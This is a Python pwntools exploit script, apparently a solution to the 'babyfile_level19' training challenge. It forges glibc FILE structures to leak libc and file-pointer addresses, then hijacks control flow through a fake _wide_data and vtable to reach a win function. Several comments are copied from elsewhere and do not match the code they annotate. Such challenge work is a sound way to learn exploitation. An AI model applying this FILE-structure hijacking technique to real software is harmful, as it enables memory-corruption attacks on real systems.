from pwn import * 

p = process('./babyfile_level19')

s = '''
b * fwrite
b * challenge+1684
'''





# leaking stack address
contains_libc = 0x405008
p.sendline("open_file")
p.sendline("new_note 0 8")
p.sendline("write_fp")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(contains_libc) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(contains_libc)
payload += p64(contains_libc+9) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout



p.sendline(payload)


p.sendline("write_file 0")



p.recvuntil("> fwrite(notes[0], 1, 8, fp);\n")
libc_address = u64(p.recv(8)) # offset between return address and win
print("libc_address @ ", hex(libc_address))







# leaking fp address

contains_fp_addr = 0x405228
p.sendline("write_fp")

offset_to_write_base = 0x8 * 1
payload = p64(0x800)
payload += b"\x00" * offset_to_write_base  # Padding
payload += p64(contains_fp_addr) # leaking stuff on the stack i.e. the rip
payload += p64(0)
payload += p64(contains_fp_addr)
payload += p64(contains_fp_addr+9) 
payload += b'\x00' * (0x8 * 8)
payload += p64(1) # _fileno = 1, stdout



p.sendline(payload)


p.sendline("write_file 0")



p.recvuntil("> fwrite(notes[0], 1, 8, fp);\n")
fp_addr = u64(p.recv(8)) # offset between return address and win
print("fp_addr @ ", hex(fp_addr))






# hijacking control flow using fake _wide_data
p.sendline("write_fp")
win = 0x4013b6

_IO_wfile_overflow = libc_address - 0x4c218

payload = b'\x00' * 0x80
payload += p64(win)
payload += p64(fp_addr + 0xe0)  # Some other field
payload += b'\x00' * 0x10  # _codecvt
payload += p64(fp_addr + 0x18)  # _wide_data
payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct
payload += p64(_IO_wfile_overflow - 0x38)
payload += b'\x41' * 0x18
payload += p64(fp_addr + 0x18)

#gdb.attach(p, s)
#time.sleep(1)

p.sendline(payload)

p.sendline("write_file 0")

p.interactive()





